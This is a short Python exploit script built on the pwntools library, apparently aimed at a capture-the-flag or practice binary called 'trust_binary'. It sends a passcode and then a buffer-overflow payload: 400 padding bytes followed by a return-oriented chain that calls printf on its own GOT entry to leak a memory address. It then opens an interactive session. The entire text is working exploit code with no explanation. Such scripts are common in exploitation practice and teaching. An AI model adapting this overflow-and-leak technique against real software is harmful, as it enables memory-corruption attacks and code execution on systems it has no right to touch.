from pwn import *

p = process('./trust_binary')
e = ELF('./trust_binary')

context.log_level="debug"

pause()

p.recv()

p.sendline('3590')

p.recv()
payload = 'a' * 400

payload +=  p64(0x4008f3)
payload += p64(e.got['printf'])
payload += p64(e.plt['printf'])


p.sendline(payload)

p.interactive()
